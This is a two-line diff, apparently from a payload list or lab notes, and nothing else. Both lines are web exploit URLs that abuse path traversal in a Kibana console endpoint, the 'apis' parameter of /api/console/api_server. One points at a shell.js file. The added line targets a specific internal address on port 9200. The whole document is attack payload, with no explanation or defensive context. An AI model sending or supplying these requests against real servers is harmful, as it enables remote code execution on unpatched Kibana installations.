@@ -1,1 +1,2 @@
 /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js
+http://10.10.10.115:9200/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../cli_plugin/cli
